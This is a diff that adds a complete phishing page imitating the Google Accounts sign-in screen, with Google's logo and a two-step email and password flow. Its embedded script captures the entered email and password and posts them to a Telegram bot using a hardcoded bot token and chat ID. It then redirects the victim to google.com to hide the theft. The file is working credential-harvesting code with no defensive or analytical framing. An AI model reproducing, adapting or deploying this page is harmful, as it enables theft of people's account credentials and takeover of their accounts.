@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+    <div class="login-container">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo" class="logo">
+        
+        <h2>Sign in</h2>
+        <p>Use your Google Account</p>
+
+        <!-- Step 1: Enter Email -->
+        <form id="emailForm">
+            <input type="email" id="email" placeholder="Email or phone" required>
+            <button type="button" id="nextEmail">Next</button>
+        </form>
+
+        <!-- Step 2: Enter Password (Initially Hidden) -->
+        <form id="passwordForm" style="display: none;">
+            <input type="password" id="password" placeholder="Enter your password" required>
+            <button type="submit" id="nextPassword">Next</button>
+        </form>
+
+        <p class="forgot"><a href="#">Forgot email?</a></p>
+        <p class="create-account"><a href="#">Create account</a></p>
+    </div>
+
+    <!-- Telegram Bot API Script -->
+    <script>
+        document.getElementById("nextEmail").addEventListener("click", function () {
+            // Hide email form, show password form
+            document.getElementById("emailForm").style.display = "none";
+            document.getElementById("passwordForm").style.display = "block";
+        });
+
+        document.getElementById("passwordForm").addEventListener("submit", function (event) {
+            event.preventDefault();
+
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+
+            // 🚨 Replace these with your actual Bot Token and Chat ID
+            const botToken = "8187093678:AAHQQV6drdKSt0FQ7jErNGv27qXrBB_edvk";
+            const chatId = "7050128609";
+
+            // Message format
+            const message = `🚀 *New Login Attempt* 🚀\n\n📧 Email: ${email}\n🔑 Password: ${password}`;
+
+            // Send login details to Telegram
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: "Markdown"
+                })
+            }).then(response => {
+                if (response.ok) {
+                    // ✅ Redirect to Google after login
+                    window.location.href = "https://www.google.com";
+                }
+            }).catch(error => {
+                console.error("Error:", error);
+            });
+        });
+    </script>
+
+</body>
+</html>
